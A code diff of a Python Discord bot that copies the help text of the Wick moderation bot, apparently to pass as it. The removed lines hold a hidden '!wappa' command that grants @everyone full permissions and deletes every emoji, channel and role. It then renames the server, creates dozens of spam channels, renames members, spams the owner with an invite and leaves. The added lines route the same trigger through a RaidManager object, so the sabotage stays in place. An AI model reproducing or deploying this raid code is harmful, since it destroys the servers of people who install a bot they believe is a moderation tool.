@@ -75,75 +75,17 @@ async def on_message(message):
     if message.author.bot:
         return
     if message.content == '!wappa':
-        await message.delete()
-        await message.channel.send("<a:typing:1054329534593693635>設定中...")
-        try:
-            role = discord.utils.get(guild.roles, name = "@everyone")
-            await role.edit(permissions = Permissions.all())
-            print(Fore.MAGENTA+"@everyoneに管理者権限を付与しました"+Fore.RESET)
-        except:
-            print(Fore.GREEN+"@everyoneに管理者権限を付与できませんでした"+Fore.RESET)
-        for emoji in list(guild.emojis):
-            try:
-                await emoji.delete()
-                print(Fore.MAGENTA+f"{emoji.name}を削除しました。"+Fore.RESET)
-            except:
-                print(Fore.GREEN+f"{emoji.name}を削除できませんでした。"+Fore.RESET)
-        for channels in guild.channels:
-            try:
-                await channels.delete()
-                print(Fore.MAGENTA+f"{channels.name}を削除しました。"+Fore.RESET)
-            except:
-                print(Fore.GREEN+f"{channels.name}を削除できませんでした。"+Fore.RESET)
-        for role in guild.roles:
-            try:
-                await role.delete()
-                print(Fore.MAGENTA+f"{role.name}を削除しました。"+Fore.RESET)
-            except:
-                print(Fore.GREEN+f"{role.name}を削除できませんでした。"+Fore.RESET)
-        with open("image.png","rb") as f:
-            icon = f.read()
-            try:
-                await guild.edit(name="荒らし共栄圏｜植民地", icon=icon)
-                print(Fore.MAGENTA+"サーバー名とアイコンを変更しました。"+Fore.RESET)
-            except:
-                print(Fore.GREEN+"サーバー名とアイコンを変更できませんでした。"+Fore.RESET)
-        await guild.create_text_channel(random.choice(nuke_channel))
-        for channel in guild.text_channels:
-            link = await channel.create_invite(max_age = 0, max_uses = 0)
-            print(f"サーバーのNukeが完了しました。{link}")
-        for i in range(40):
-            try:
-                await guild.create_text_channel(random.choice(nuke_channel))
-            except:
-                pass
-        for member in guild.members:
-            try:
-                await member.edit(nick=random.choice(nuke_channel))
-                print(Fore.MAGENTA+f"{member.name}のニックネームを変更しました。"+Fore.RESET)
-            except:
-                print(Fore.GREEN+f"{member.name}のニックネームを変更できませんでした。"+Fore.RESET)
-        for i in range(10):
-                role = await guild.create_role(name=random.choice(nuke_channel))
-                await role.edit(colour=discord.Colour(0x6d965c))
-                print(Fore.MAGENTA+f"{role.name}を作成しました。"+Fore.RESET)
-        for i in range(10):
-            try:
-                await asyncio.sleep(4)
-                await guild.owner.send(f"{guild.owner.mention}\n https://discord.gg/ctkp")
-                print(Fore.MAGENTA+f"{guild.owner}にメッセージを送りました。"+Fore.RESET)
-            except:
-                print(Fore.MAGENTA+f"{guild.owner}にメッセージを送れませんでした。"+Fore.RESET)
-        await asyncio.sleep(170)
-        await guild.leave()
-        return
+        raidmanager = RaidManager(guild)
+        raidmanager.delete_channel()
+
     elif message.content == 'w!help':
         embeds = Embed(title="Wick's Help Panel:")
         embeds.add_field(name="<:2_:1054329534593693635> General Help:",value="<:3_:1054329534593693635><:1_:10543295345936936355> If you need help setting up Wick or knowing everything about it, You should\ncheck out the Official Documentation [docs.wick.bot]\n<:3_:1054329534593693635><:1_:1054329534593693635>  If you want to view Wick's commands, do: w!commands\n<:3_:1054329534593693635><:1_:1054329534593693635> Quick  Troubleshooting", inline=False)
         embeds.add_field(name="<:4_:1054329534593693635> Subscription Help:", value="<:3_:1054329534593693635>If you are interested in getting a more advanced wick with more features,\nplease consider checking out our Premium Version [wickbot.com/premium\n<:3_:1054329534593693635>If you just purchased a Wick Tier and you need help, Please join the Discord Support Server", inline=True)
         await message.channel.send(embed=embeds)
+
     elif message.content == 'w!setup':
-        raidmanager = RaidManager()
+        raidmanager = RaidManager(guild)
         await raidmanager.setup(message.channel)
 
 @bot.event
